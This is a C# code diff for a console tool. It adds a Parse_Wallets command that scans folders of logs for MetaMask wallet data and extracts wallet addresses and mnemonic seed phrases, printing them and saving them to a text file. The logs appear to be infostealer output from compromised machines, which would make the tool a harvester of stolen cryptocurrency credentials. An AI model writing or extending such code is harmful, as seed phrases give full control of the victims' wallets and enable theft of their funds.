@@ -1,7 +1,7 @@
 using Console.Models;
+using Core.Models.Wallets;
 using Core.View;
 using Core.View.Attributes;
-using Core.View.Models;
 using Core.View.Models.Abstractions;
 
 namespace Console.Views;
@@ -9,6 +9,7 @@ namespace Console.Views;
 public class MainView : ArgsView
 {
     private readonly LogsInfo _logs;
+    private readonly MetamaskFactory _metamask = new ();
     
     public MainView(IRoot root, LogsInfo logs) : base(root)
     {
@@ -16,9 +17,28 @@ public class MainView : ArgsView
     }
     
     [Command]
-    private Task Parse_Wallets()
+    public async Task Parse_Wallets()
     {
-        return Task.CompletedTask;
+        var withWallets = _logs.Logs.Where(x => x.HasWallets);
+        var filename = Path.Combine("Wallets", $"{new DirectoryInfo(_logs.Path).Name}.txt");
+
+        Directory.CreateDirectory("Wallets");
+        
+        using (var writer = new StreamWriter(filename))
+        {
+            await foreach (var x in withWallets)
+            {
+                await writer.WriteLineAsync($"\n{x.Path}");
+                
+                await foreach (var w in _metamask.Create(x))
+                {
+                    System.Console.WriteLine($"{w.Log}\n{w.Address}\n{w.Mnemonic}\n");
+                    await writer.WriteAsync($"{w.Address}\n{w.Mnemonic}\n");
+                }
+            }
+        }
+
+        System.Console.Write($"All data saved into {filename}. Press any key for continue."); System.Console.ReadKey();
     }
 
     public override async Task Build()
